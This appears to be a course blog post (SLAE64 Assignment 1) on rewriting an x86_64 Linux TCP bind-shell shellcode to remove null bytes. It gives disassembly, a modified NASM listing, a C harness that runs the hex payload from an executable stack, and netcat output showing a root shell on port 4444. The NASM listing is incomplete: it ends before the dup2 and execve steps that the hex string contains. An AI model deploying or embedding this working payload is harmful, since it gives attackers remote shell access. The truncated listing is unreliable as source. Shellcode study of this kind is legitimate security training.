---
title: SLAE64 Assignment 1 - Remove Nulls TCP Bindshell
date: 2020-4-28
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Bind
  - Shell
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)

## Overview
The second part of the first assignment of SLAE64 was to remove the nulls from the bindshell provided by Pentester Academy.

## Compiling & Testing Original - With GCC in C Host Program
```bash
root@zed# ./shellcode
Shellcode Length:  2
```
+ We can see here that these nulls truncate our shellcode when executed in a host program.
+ This is because `\x00` will terminate a string in the host program.
+ Most of the time shellcode is injected into the host program by overflowing the string of a buffer, therefor truncating the shellcode.

## Compiling & Testing Original - With NASM & LD
The shellcode works great if it is compiled and ran as its own program. This means the shellcode logic is good. 

#### Terminal 1
```bash
root# nasm -f elf64 bindshell.asm -o bindshell.o
root# rm shellcode
root# ld bindshell.o -o bindshell
root# ./bindshell

```

#### Terminal 2

```bash
root# nc 127.0.0.1 4444
id
uid=0(root) gid=0(root) groups=0(root),46(plugdev)
```

## Removing Nulls
To make this shellcode injectable into most host programs, we will need to remove the `0x00` aka `Nulls`.

To determine which assembly instructions are producing the nulls, we will use `objdump` on the object file.

```bash
root# objdump -D bindshell.o -M intel
   0:   b8 29 00 00 00          mov    eax,0x29
   5:   bf 02 00 00 00          mov    edi,0x2
   a:   be 01 00 00 00          mov    esi,0x1
   f:   ba 00 00 00 00          mov    edx,0x0
  14:   0f 05                   syscall
  16:   48 89 c7                mov    rdi,rax
  19:   48 31 c0                xor    rax,rax
  1c:   50                      push   rax
  1d:   89 44 24 fc             mov    DWORD PTR [rsp-0x4],eax
  21:   66 c7 44 24 fa 11 5c    mov    WORD PTR [rsp-0x6],0x5c11
  28:   66 c7 44 24 f8 02 00    mov    WORD PTR [rsp-0x8],0x2
  2f:   48 83 ec 08             sub    rsp,0x8
  33:   b8 31 00 00 00          mov    eax,0x31
  38:   48 89 e6                mov    rsi,rsp
  3b:   ba 10 00 00 00          mov    edx,0x10
  40:   0f 05                   syscall
  42:   b8 32 00 00 00          mov    eax,0x32
  47:   be 02 00 00 00          mov    esi,0x2
  4c:   0f 05                   syscall
  4e:   b8 2b 00 00 00          mov    eax,0x2b
  53:   48 83 ec 10             sub    rsp,0x10
  57:   48 89 e6                mov    rsi,rsp
  5a:   c6 44 24 ff 10          mov    BYTE PTR [rsp-0x1],0x10
  5f:   48 83 ec 01             sub    rsp,0x1
  63:   48 89 e2                mov    rdx,rsp
  66:   0f 05                   syscall
  68:   49 89 c1                mov    r9,rax
  6b:   b8 03 00 00 00          mov    eax,0x3
  70:   0f 05                   syscall
  72:   4c 89 cf                mov    rdi,r9
  75:   b8 21 00 00 00          mov    eax,0x21
  7a:   be 00 00 00 00          mov    esi,0x0
  7f:   0f 05                   syscall
  81:   b8 21 00 00 00          mov    eax,0x21
  86:   be 01 00 00 00          mov    esi,0x1
  8b:   0f 05                   syscall
  8d:   b8 21 00 00 00          mov    eax,0x21
  92:   be 02 00 00 00          mov    esi,0x2
  97:   0f 05                   syscall
  99:   48 31 c0                xor    rax,rax
  9c:   50                      push   rax
  9d:   48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
  a4:   2f 73 68
  a7:   53                      push   rbx
  a8:   48 89 e7                mov    rdi,rsp
  ab:   50                      push   rax
  ac:   48 89 e2                mov    rdx,rsp
  af:   57                      push   rdi
  b0:   48 89 e6                mov    rsi,rsp
  b3:   48 83 c0 3b             add    rax,0x3b
  b7:   0f 05                   syscall
```

+ After investigating the shellcode, we can see that the Nulls exist due to the mov instructions used.

## Modified Null-Free Shellcode
To remove the 0x00's from the shellcode, we will need to substitute the mov instructions.

```nasm
global _start
_start:
; sock = socket(AF_INET, SOCK_STREAM, 0)
xor rdi, rdi ; rdi=0x0
mul rdi      ; rax&rdx=0x0
add rax, 41  ; socket syscall number 41
add rdi, 2   ; AF_INET=0x2
push rdx
pop rsi
inc rsi      ; rsi=0x1=SOCK_STREAM
syscall
mov rdi, rax ; rdi=socket-fd
; server.sin_family = AF_INET
; server.sinport = htons(PORT)
; server.sinaddr.saddr = INADDRANY
; bzero(&server.sinzero, 8)
dec rsi
mul rsi
add al, 0x31     ; rax = 0x31 = socket syscall
push rdx         ; 8 bytes of zeros for second half of struct
push dx          ; 4 bytes of zeros for IPADDRANY
push dx          ; 4 bytes of zeros for IPADDRANY
push word 0x5c11 ; push 2 bytes for TCP Port 4444
inc rdx
inc rdx          ; rdx = 0x2 ; dx = 0x0002
push dx          ; 0x2 = AFINET
add dl, 0xe      ; rdi = 0x10 = sizeof(ipSocketAddr)
mov rsi, rsp     ; rsi = &ipSocketAddr
syscall
; listen(sock, MAXCLIENTS)
mul rsi      ; rax&rdx=0x0
add rax, 50
inc rsi
inc rsi
syscall
; new = accept(sock, (struct sockaddr client, &sockaddrlen)
mul rdx
add rax, 43
sub rsp, 16
mov rsi, rsp
mov byte [rsp-1], 16
sub rsp, 1
mov rdx, rsp
syscall
; store the client socket description
mov r9, rax
; close parent
xor rax, rax
add rax, 3
syscall
```



## Assemble the new shellcode

```bash
root# nasm -f elf64 mod-bindshell.asm -o mod-bindshell.o
root# ld mod-bindshell.o -o mod-bindshell
root# ./mod-bindshell
root# for i in $(objdump -D mod-bindshell.o | grep "^ " | cut -f2); do echo -n '\x'$i; done
```

## Add the Modified Shellcode to the C Host Program

```c
#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\x48\x31\xff\x48\xf7\xe7\x48\x83\xc0\x29\x48\x83"
"\xc7\x02\x52\x5e\x48\xff\xc6\x0f\x05\x48\x89\xc7"
"\x48\xff\xce\x48\xf7\xe6\x04\x31\x52\x66\x52\x66"
"\x52\x66\x68\x11\x5c\x48\xff\xc2\x48\xff\xc2\x66"
"\x52\x80\xc2\x0e\x48\x89\xe6\x0f\x05\x48\xf7\xe6"
"\x48\x83\xc0\x32\x48\xff\xc6\x48\xff\xc6\x0f\x05"
"\x48\xf7\xe2\x48\x83\xc0\x2b\x48\x83\xec\x10\x48"
"\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48"
"\x89\xe2\x0f\x05\x49\x89\xc1\x48\x31\xc0\x48\x83"
"\xc0\x03\x0f\x05\x48\x31\xf6\x48\xf7\xe6\x4c\x89"
"\xcf\x48\x83\xc0\x21\x50\x0f\x05\x58\x50\x48\xff"
"\xc6\x0f\x05\x58\x50\x48\xff\xc6\x0f\x05\x48\x31"
"\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
"\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6"
"\x48\x83\xc0\x3b\x0f\x05";
int main()
{
 printf("Shellcode Length:  %d\n", strlen(shellcode));
 int (*ret)() = (int(*)())shellcode;
 ret();
}
```


#### Terminal 1
```bash
root# gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
root# ./shellcode
Shellcode Length:  174

```

#### Terminal 2

```bash
root# nc 127.0.0.1 4444
id
uid=0(root) gid=0(root) groups=0(root)
```

+ Awesome! Our modified bindshell works from the host program and contains no nulls!!


## SLAE64 Blog Proof
```bash
This blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64):
    https://www.pentesteracademy.com/course?id=7
SLAE/Student ID: PA-10913
```

